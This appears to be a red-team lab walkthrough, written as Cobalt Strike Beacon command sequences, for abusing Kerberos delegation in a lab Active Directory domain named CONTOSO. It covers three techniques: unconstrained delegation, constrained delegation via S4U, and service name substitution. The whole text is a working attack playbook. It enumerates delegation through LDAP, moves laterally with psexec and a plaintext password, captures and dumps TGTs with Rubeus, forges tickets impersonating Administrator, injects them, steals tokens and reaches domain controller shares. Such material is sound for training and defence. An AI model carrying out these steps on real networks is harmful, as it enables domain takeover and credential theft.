
### Unconstrained Delegation
- Use LDAP to find computers configured for unconstrained delegation.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb

-  Run Rubeus in monitor mode on _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap`
    
-  Wait 1-2 minutes for the TGT of a domain administrator to be captured.
    
-  Stop Rubeus.
    
    1. jobs
    2. jobkill 0

-  Inject the captured TGT into a sacrificial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET]`
    
-  Impersonate the spawned process.
    
    1. steal_token [PID]
-  Verify the ticket is present.
    
    1. run klist
-  Use it to access _lon-dc-1_.
    
    1. ls \\lon-dc-1\c$
-  Drop the impersonation.
    
    1. rev2self
-  Terminate the spawned process.
    
    1. kill [PID]

### Constrained Delegation
- Search for computers whose msDS-AllowedToDelegateTo attribute is not null.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo`
    
-  Get the UAC value for _lon-ws-1_ to see if the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl`
    
    TerminalTypeCopy
    
    `[Convert]::ToBoolean(16781312 -band 16777216)`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb
-  Dump _lon-ws-1_'s TGT.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
    
-  Perform the S4U abuse to obtain a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain admin.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap`
    
-  Inject the ticket into a sacrificial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
    
-  Impersonate the process.
    
    1. steal_token [PID]
-  Verify the ticket has been injected.
    
    1. run klist
-  Use the ticket to access _lon-fs-1_.
    
    1. ls \\lon-fs-1\c$

### Service Name Substitution
- Search for computers whose msDS-AllowedToDelegateTo attribute is not null.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo`
    
-  Get the UAC value for _lon-ws-1_ to see if the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb
-  Dump the TGT for _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
    
-  Perform the S4U abuse to obtain a usable service ticket for _time/lon-dc-1_, substituting the service name for _cifs_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[TGT] /impersonateuser:Administrator /nowrap`
    
-  Inject the ticket into a sacraficial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
    
-  Impersonate the process.
    
    1. steal_token [PID]
-  Verify the ticket has been injected.
    
    1. run klist
-  Use the ticket to list the C$ share on _lon-dc-1_.
    
    1. ls \\lon-dc-1\c$